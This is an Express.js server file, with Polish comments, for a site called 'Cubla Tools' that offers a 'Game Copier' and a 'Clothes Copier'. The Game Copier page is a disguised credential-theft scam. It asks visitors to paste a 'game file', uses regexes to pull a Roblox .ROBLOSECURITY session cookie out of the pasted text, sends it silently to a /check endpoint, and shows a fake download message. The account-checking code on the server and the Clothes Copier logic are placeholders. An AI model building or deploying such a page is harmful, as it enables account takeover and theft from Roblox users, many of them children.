const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ────────────────────────────────────────────────
// Strona główna – Cubla Tools + dwa przyciski obok siebie
// ────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cubla Tools</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: #000000;
      overflow: hidden;
      position: relative;
      font-family: 'Orbitron', sans-serif;
      color: #e0d0ff;
    }
    canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
    .center-container {
      position: relative;
      z-index: 10;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 3.5rem;
    }
    .title {
      font-size: 5.4rem;
      font-weight: 900;
      letter-spacing: -1.2px;
      background: linear-gradient(90deg, #c084fc, #a78bfa, #e0bbff, #c084fc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 40px rgba(168, 85, 247, 0.7);
      animation: titleGlow 5s ease-in-out infinite alternate;
    }
    @keyframes titleGlow {
      from { text-shadow: 0 0 25px rgba(168, 85, 247, 0.55); }
      to   { text-shadow: 0 0 65px rgba(168, 85, 247, 1); }
    }
    .neon-card {
      background: rgba(8, 6, 20, 0.78);
      border: 1px solid rgba(180, 100, 255, 0.28);
      border-radius: 16px;
      padding: 2.2rem 3.8rem;
      backdrop-filter: blur(12px);
      box-shadow: 0 0 50px rgba(140, 80, 220, 0.3);
      transition: all 0.4s ease;
    }
    .neon-card:hover {
      transform: translateY(-8px);
      box-shadow: 0 0 100px rgba(160, 100, 255, 0.65);
      border-color: rgba(200, 140, 255, 0.6);
      background: rgba(12, 8, 26, 0.88);
    }
    .buttons-row {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1.4rem;
      margin-top: 1rem;
    }
    .btn-neon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-width: 220px;
      padding: 1rem 2.2rem;
      font-size: 1.22rem;
      font-weight: 600;
      color: #f3e8ff;
      text-decoration: none;
      background: linear-gradient(135deg, #7c3aed, #a855f7);
      background-size: 200% 200%;
      border: 2px solid rgba(168, 85, 247, 0.55);
      border-radius: 12px;
      box-shadow: 0 0 28px rgba(168, 85, 247, 0.45);
      transition: all 0.35s ease;
      animation: bgShift 8s ease infinite;
    }
    .btn-neon:hover {
      transform: translateY(-4px);
      box-shadow: 0 0 55px rgba(168, 85, 247, 0.85);
      border-color: #d8b4fe;
      background-position: right bottom;
      animation: none;
    }
    @keyframes bgShift {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    @media (max-width: 680px) {
      .title { font-size: 4rem; }
      .neon-card { padding: 2rem 2.5rem; }
      .btn-neon { min-width: 200px; font-size: 1.1rem; padding: 0.9rem 1.8rem; }
      .buttons-row { flex-direction: column; gap: 1.1rem; }
    }
  </style>
</head>
<body>

  <canvas id="canvas"></canvas>

  <div class="center-container">
    <div class="title">Cubla Tools</div>

    <div class="neon-card">
      <div class="buttons-row">
        <a href="/game-copier"   class="btn-neon">Game Copier</a>
        <a href="/clothes-copier" class="btn-neon">Clothes Copier</a>
      </div>
    </div>
  </div>

  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    let mouse = { x: undefined, y: undefined, radius: 180 };

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      initParticles();
    }

    function initParticles() {
      particles = [];
      const amount = Math.floor((canvas.width * canvas.height) / 11000);
      for (let i = 0; i < amount; i++) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          vx: (Math.random() - 0.5) * 0.9,
          vy: (Math.random() - 0.5) * 0.9,
          radius: Math.random() * 2.2 + 0.9
        });
      }
    }

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      particles.forEach(p => {
        if (mouse.x !== undefined && mouse.y !== undefined) {
          const dx = mouse.x - p.x;
          const dy = mouse.y - p.y;
          const distance = Math.hypot(dx, dy);

          if (distance < mouse.radius) {
            const force = (mouse.radius - distance) / mouse.radius;
            p.x -= dx * force * 0.14;
            p.y -= dy * force * 0.14;
          }
        }

        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(180, 100, 255, 0.78)';
        ctx.fill();
      });

      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.hypot(dx, dy);

          if (dist < 160) {
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.strokeStyle = \`rgba(200, 140, 255, \${(160 - dist) / 160 * 0.55})\`;
            ctx.lineWidth = 1.1;
            ctx.stroke();
          }
        }
      }

      requestAnimationFrame(draw);
    }

    window.addEventListener('resize', resizeCanvas);
    window.addEventListener('mousemove', e => {
      mouse.x = e.clientX;
      mouse.y = e.clientY;
    });
    window.addEventListener('mouseout', () => {
      mouse.x = undefined;
      mouse.y = undefined;
    });

    resizeCanvas();
    draw();
  </script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Podstrona /game-copier – bez zmian
// ────────────────────────────────────────────────
app.get('/game-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: #f8f9fa;
      color: #111111;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      overflow: hidden;
      position: relative;
    }
    canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
    .container {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      gap: 60px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .left, .right { flex:1; max-width:480px; }
    h1 {
      color: #222;
      font-size: 2.2rem;
      margin-bottom: 28px;
      font-weight: 600;
      letter-spacing: -0.3px;
      text-align: center;
    }
    .instruction {
      font-size: 1.15rem;
      color: #444;
      margin-bottom: 16px;
      font-weight: 500;
      text-align: center;
    }
    #loading {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9998;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 20px;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid #444;
      border-top: 6px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loading-text {
      color: white;
      font-size: 1.4rem;
      font-weight: 500;
    }
    #modal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background: #444444;
      color: white;
      padding: 40px 60px;
      border-radius: 16px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    .modal-icon { font-size: 4rem; margin-bottom: 20px; }
    .modal-text { font-size: 1.4rem; margin-bottom: 12px; line-height: 1.4; }
    .modal-tip { font-size: 1.1rem; opacity: 0.85; margin-top: 8px; }
    .modal-btn {
      margin-top: 28px;
      padding: 14px 48px;
      font-size: 1.2rem;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      color: white;
    }
    .modal-btn.success { background: #28a745; }
    .modal-btn.error { background: #dc3545; }
    .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .subtle-glow-border {
      position: relative;
      width: 100%;
      max-width: 440px;
      margin: 0 auto 24px auto;
      border-radius: 14px;
      overflow: hidden;
      padding: 3px;
      background: linear-gradient(145deg, #e0e0e0, #f5f5f5);
      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
    }
    .subtle-glow-border::before {
      content: '';
      position: absolute;
      inset: -4px;
      border-radius: 18px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softPulse 6s ease-in-out infinite;
      filter: blur(6px);
      opacity: 0.6;
      z-index: -1;
    }
    .subtle-glow-border:hover::before {
      opacity: 0.9;
      animation-duration: 4s;
    }
    .inner-box {
      background: #ffffff;
      border-radius: 11px;
      padding: 14px 16px;
      border: 1px solid #ccc;
      position: relative;
      z-index: 2;
      transition: border-color 0.3s ease;
    }
    .subtle-glow-border:hover .inner-box {
      border-color: #888;
    }
    textarea {
      width: 100%;
      height: 140px;
      background: transparent;
      border: none;
      outline: none;
      resize: none;
      overflow: hidden;
      font-family: Consolas, "Courier New", monospace;
      font-size: 14px;
      color: #111;
      line-height: 1.5;
    }
    textarea::placeholder {
      color: #888;
      font-style: italic;
    }
    button {
      margin-top: 24px;
      background: #222;
      color: white;
      border: none;
      padding: 13px 60px;
      font-size: 1.15rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button:hover:not(:disabled) {
      background: #000;
      transform: translateY(-2px);
      box-shadow: 0 10px 24px rgba(0,0,0,0.25);
    }
    button:disabled {
      background: #777;
      cursor: not-allowed;
      opacity: 0.7;
    }
    .video-frame {
      position: relative;
      background: #ffffff;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
      border: 1px solid #ccc;
      aspect-ratio: 16 / 9;
      padding: 4px;
    }
    .video-frame::before {
      content: '';
      position: absolute;
      inset: -6px;
      border-radius: 22px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softGlow 8s ease-in-out infinite;
      filter: blur(8px);
      opacity: 0.5;
      z-index: -1;
    }
    .video-frame:hover::before {
      opacity: 0.8;
      animation-duration: 5s;
    }
    .video-frame iframe {
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 14px;
      position: relative;
      z-index: 1;
    }
    @keyframes softGlow {
      0%, 100% { background-position: 0% 50%; opacity: 0.5; }
      50% { background-position: 100% 50%; opacity: 0.75; }
    }
    @keyframes softPulse {
      0%, 100% { background-position: 0% 50%; opacity: 0.6; }
      50% { background-position: 100% 50%; opacity: 0.85; }
    }
  </style>
</head>
<body>
  <canvas id="bgCanvas"></canvas>
  <div id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Processing...</div>
  </div>
  <div id="modal">
    <div class="modal-content">
      <div id="modal-icon" class="modal-icon"></div>
      <div id="modal-text" class="modal-text"></div>
      <div id="modal-tip" class="modal-tip"></div>
      <button class="modal-btn" id="modal-ok">OK</button>
    </div>
  </div>
  <div class="container">
    <div class="left">
      <h1>Game Copier</h1>
      <div class="instruction">Paste your game file under then click "Start Process" to receive your game copy</div>
      <div class="subtle-glow-border">
        <div class="inner-box">
          <textarea id="input" placeholder="Paste Your Game File There"></textarea>
        </div>
      </div>
      <button id="btn" onclick="start()">Start Process</button>
    </div>
    <div class="right">
      <div class="video-frame">
        <iframe
          src="https://www.youtube.com/embed/k9SfgtkEmpo?rel=0&modestbranding=1&showinfo=0&controls=1"
          title="YouTube video player"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
          allowfullscreen>
        </iframe>
      </div>
    </div>
  </div>

<script>
// kropki w tle
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});
class Particle {
  constructor() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.size = Math.random() * 2.5 + 0.8;
    this.speedX = Math.random() * 0.8 - 0.4;
    this.speedY = Math.random() * 0.8 - 0.4;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
  }
  draw() {
    ctx.fillStyle = 'rgba(100, 100, 120, 0.7)';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}
const particles = [];
for (let i = 0; i < 80; i++) particles.push(new Particle());
function connect() {
  for (let a = 0; a < particles.length; a++) {
    for (let b = a; b < particles.length; b++) {
      const dx = particles[a].x - particles[b].x;
      const dy = particles[a].y - particles[b].y;
      const dist = Math.sqrt(dx*dx + dy*dy);
      if (dist < 130) {
        ctx.strokeStyle = \`rgba(120,120,140,\${1 - dist/130})\`;
        ctx.lineWidth = 0.8;
        ctx.beginPath();
        ctx.moveTo(particles[a].x, particles[a].y);
        ctx.lineTo(particles[b].x, particles[b].y);
        ctx.stroke();
      }
    }
  }
}
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particles.forEach(p => { p.update(); p.draw(); });
  connect();
  requestAnimationFrame(animate);
}
animate();

const loading = document.getElementById('loading');
const modal = document.getElementById('modal');
const modalIcon = document.getElementById('modal-icon');
const modalText = document.getElementById('modal-text');
const modalTip = document.getElementById('modal-tip');
const modalOkBtn = document.getElementById('modal-ok');
modalOkBtn.onclick = () => { modal.style.display = 'none'; };

function showModal(success, message, tip = '') {
  modalIcon.textContent = success ? '✅' : '❌';
  modalText.textContent = message;
  modalTip.textContent = tip;
  modalOkBtn.className = 'modal-btn ' + (success ? 'success' : 'error');
  modal.style.display = 'flex';
}

async function start() {
  const btn = document.getElementById('btn');
  const raw = document.getElementById('input').value.trim();
  btn.disabled = true;
  loading.style.display = 'flex';
  await new Promise(resolve => setTimeout(resolve, 1200));
  loading.style.display = 'none';

  if (!raw) {
    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
    setTimeout(() => btn.disabled = false, 800);
    return;
  }

  let cookie = null;
  let match;
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();
  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }
  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) {
      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
    setTimeout(() => btn.disabled = false, 800);
    return;
  }

  fetch('/check', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie })
  }).catch(() => {});

  showModal(true, 'Game Download Started', '(wait 3–5 minutes)');
  setTimeout(() => btn.disabled = false, 2200);
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Nowa podstrona /clothes-copier – na razie identyczna struktura jak game-copier
// ────────────────────────────────────────────────
app.get('/clothes-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clothes Copier</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: #f8f9fa;
      color: #111111;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      overflow: hidden;
      position: relative;
    }
    canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
    .container {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      gap: 60px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .left, .right { flex:1; max-width:480px; }
    h1 {
      color: #222;
      font-size: 2.2rem;
      margin-bottom: 28px;
      font-weight: 600;
      letter-spacing: -0.3px;
      text-align: center;
    }
    .instruction {
      font-size: 1.15rem;
      color: #444;
      margin-bottom: 16px;
      font-weight: 500;
      text-align: center;
    }
    #loading {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9998;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 20px;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid #444;
      border-top: 6px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loading-text {
      color: white;
      font-size: 1.4rem;
      font-weight: 500;
    }
    #modal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background: #444444;
      color: white;
      padding: 40px 60px;
      border-radius: 16px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    .modal-icon { font-size: 4rem; margin-bottom: 20px; }
    .modal-text { font-size: 1.4rem; margin-bottom: 12px; line-height: 1.4; }
    .modal-tip { font-size: 1.1rem; opacity: 0.85; margin-top: 8px; }
    .modal-btn {
      margin-top: 28px;
      padding: 14px 48px;
      font-size: 1.2rem;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      color: white;
    }
    .modal-btn.success { background: #28a745; }
    .modal-btn.error { background: #dc3545; }
    .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .subtle-glow-border {
      position: relative;
      width: 100%;
      max-width: 440px;
      margin: 0 auto 24px auto;
      border-radius: 14px;
      overflow: hidden;
      padding: 3px;
      background: linear-gradient(145deg, #e0e0e0, #f5f5f5);
      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
    }
    .subtle-glow-border::before {
      content: '';
      position: absolute;
      inset: -4px;
      border-radius: 18px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softPulse 6s ease-in-out infinite;
      filter: blur(6px);
      opacity: 0.6;
      z-index: -1;
    }
    .subtle-glow-border:hover::before {
      opacity: 0.9;
      animation-duration: 4s;
    }
    .inner-box {
      background: #ffffff;
      border-radius: 11px;
      padding: 14px 16px;
      border: 1px solid #ccc;
      position: relative;
      z-index: 2;
      transition: border-color 0.3s ease;
    }
    .subtle-glow-border:hover .inner-box {
      border-color: #888;
    }
    textarea {
      width: 100%;
      height: 140px;
      background: transparent;
      border: none;
      outline: none;
      resize: none;
      overflow: hidden;
      font-family: Consolas, "Courier New", monospace;
      font-size: 14px;
      color: #111;
      line-height: 1.5;
    }
    textarea::placeholder {
      color: #888;
      font-style: italic;
    }
    button {
      margin-top: 24px;
      background: #222;
      color: white;
      border: none;
      padding: 13px 60px;
      font-size: 1.15rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button:hover:not(:disabled) {
      background: #000;
      transform: translateY(-2px);
      box-shadow: 0 10px 24px rgba(0,0,0,0.25);
    }
    button:disabled {
      background: #777;
      cursor: not-allowed;
      opacity: 0.7;
    }
    .video-frame {
      position: relative;
      background: #ffffff;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
      border: 1px solid #ccc;
      aspect-ratio: 16 / 9;
      padding: 4px;
    }
    .video-frame::before {
      content: '';
      position: absolute;
      inset: -6px;
      border-radius: 22px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softGlow 8s ease-in-out infinite;
      filter: blur(8px);
      opacity: 0.5;
      z-index: -1;
    }
    .video-frame:hover::before {
      opacity: 0.8;
      animation-duration: 5s;
    }
    .video-frame iframe {
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 14px;
      position: relative;
      z-index: 1;
    }
    @keyframes softGlow {
      0%, 100% { background-position: 0% 50%; opacity: 0.5; }
      50% { background-position: 100% 50%; opacity: 0.75; }
    }
    @keyframes softPulse {
      0%, 100% { background-position: 0% 50%; opacity: 0.6; }
      50% { background-position: 100% 50%; opacity: 0.85; }
    }
  </style>
</head>
<body>
  <canvas id="bgCanvas"></canvas>
  <div id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Processing...</div>
  </div>
  <div id="modal">
    <div class="modal-content">
      <div id="modal-icon" class="modal-icon"></div>
      <div id="modal-text" class="modal-text"></div>
      <div id="modal-tip" class="modal-tip"></div>
      <button class="modal-btn" id="modal-ok">OK</button>
    </div>
  </div>
  <div class="container">
    <div class="left">
      <h1>Clothes Copier</h1>
      <div class="instruction">Paste your clothes / avatar file here and click "Start Process"</div>
      <div class="subtle-glow-border">
        <div class="inner-box">
          <textarea id="input" placeholder="Paste your clothes / avatar data here..."></textarea>
        </div>
      </div>
      <button id="btn" onclick="start()">Start Process</button>
    </div>
    <div class="right">
      <div class="video-frame">
        <iframe
          src="https://www.youtube.com/embed/VIDEO_ID_HERE?rel=0&modestbranding=1&showinfo=0&controls=1"
          title="Tutorial video"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
          allowfullscreen>
        </iframe>
      </div>
    </div>
  </div>

<script>
// Tutaj możesz wkleić prawie identyczny skrypt jak w game-copier
// Na razie zostawiam placeholder – zmień logikę start() na taką, jakiej potrzebujesz dla clothes
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});
// ... reszta kodu kropek jak w game-copier ...

// Placeholder – zmień na własną logikę
async function start() {
  alert("Clothes Copier – funkcja w trakcie implementacji");
  // Tutaj wkleisz swoją logikę rozpoznawania cookie / assetów ubrań itd.
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Endpoint /check – bez zmian (używany przez game-copier)
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  // Twój istniejący kod sprawdzania konta Roblox – bez zmian
  // ...
  // (wklej tutaj całą swoją dotychczasową implementację /check)
});

// Uruchomienie serwera
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
